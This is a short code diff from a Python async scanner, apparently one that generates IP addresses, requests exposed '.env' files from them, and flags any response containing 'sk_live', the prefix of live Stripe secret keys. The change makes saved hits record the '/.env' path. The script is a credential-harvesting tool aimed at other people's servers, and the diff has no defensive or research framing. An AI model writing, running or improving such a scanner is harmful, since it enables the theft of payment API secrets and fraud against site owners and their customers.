@@ -51,11 +51,11 @@ async def IPGenAndEnvCheck(session):
                 text = await resp.text()
                 if 'sk_live' in text:
                     print(f"{ip} - LIVE SK FOUND ✅")
-                    await save_hit(ip)
+                    await save_hit(f'{ip}/.env')
                     live_sks.add(ip)
                 else:
                     print(f"{ip} - NOT FOUND SK 🚫")
-                    await save_live(ip)
+                    await save_live(f'{ip}/.env')
                     live_ips.add(ip)
             else:
                 print(f"{ip} - {resp.status}")
